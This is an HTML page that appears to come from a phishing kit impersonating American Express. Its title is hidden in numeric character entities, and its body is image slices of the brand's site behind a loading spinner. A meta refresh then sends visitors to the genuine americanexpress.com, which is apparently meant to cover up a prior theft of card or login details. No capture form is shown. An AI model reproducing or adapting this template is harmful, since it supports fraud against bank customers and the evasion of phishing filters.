<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>&#65;&#109;&#101;&#114;&#105;&#99;&#97;&#110;&#32;&#69;&#120;&#112;&#114;&#101;&#115;&#115;&#32;&#67;&#114;&#101;&#100;&#105;&#116;&#32;&#67;&#97;&#114;&#100;&#115;&#44;&#32;&#82;&#101;&#119;&#97;&#114;&#100;&#115;&#44;&#32;&#84;&#114;&#97;&#118;&#101;&#108;&#32;&#97;&#110;&#100;&#32;&#66;&#117;&#115;&#105;&#110;&#101;&#115;&#115;&#32;&#83;&#101;&#114;&#118;&#105;&#99;&#101;&#115;</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="shortcut icon"
              href="img/favicon.ico"/>
<html><meta http-equiv="Refresh" content="05; url=https://www.americanexpress.com"></html>
<style type="text/css">
div#container
{
	position:relative;
	width: 1349px;
	margin-top: 0px;
	margin-left: auto;
	margin-right: auto;
	text-align:left; 
}
body {text-align:center;margin:0}
</style>
<style>
p{font-size: 40px;}
.loader {
    position: fixed;
    left: 0px;
    top: 0px;
    width: 100%;
    height: 100%;
    z-index: 9999;
    background: url('https://smallenvelop.com/wp-content/uploads/2014/08/Preloader_11.gif') 50% 50% no-repeat rgb(249,249,249);
    opacity: .8;
}
</style>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
<script type="text/javascript">
$(window).load(function() {
	$(".loader").fadeOut("slow");
});
</script>
</head>
<body bgColor="#EDEDED">
<div class="loader"></div>
<div id="container">
<div id="image5" style="position:absolute; overflow:hidden; left:0px; top:497px; width:1349px; height:497px; z-index:0"><a href="#"><img src="img/e7.png" alt="" title="" border=0 width=1349 height=497></a></div>

<div id="image1" style="position:absolute; overflow:hidden; left:0px; top:0px; width:1349px; height:61px; z-index:1"><a href="#"><img src="img/d6.png" alt="" title="" border=0 width=1349 height=61></a></div>

<div id="image2" style="position:absolute; overflow:hidden; left:175px; top:68px; width:997px; height:354px; z-index:2"><img src="img/d10.png" alt="" title="" border=0 width=997 height=354></div>

<div id="image3" style="position:absolute; overflow:hidden; left:646px; top:278px; width:66px; height:66px; z-index:3"><img src="img/ex.gif" alt="" title="" border=0 width=66 height=66></div>

</div>

</body>
</html>
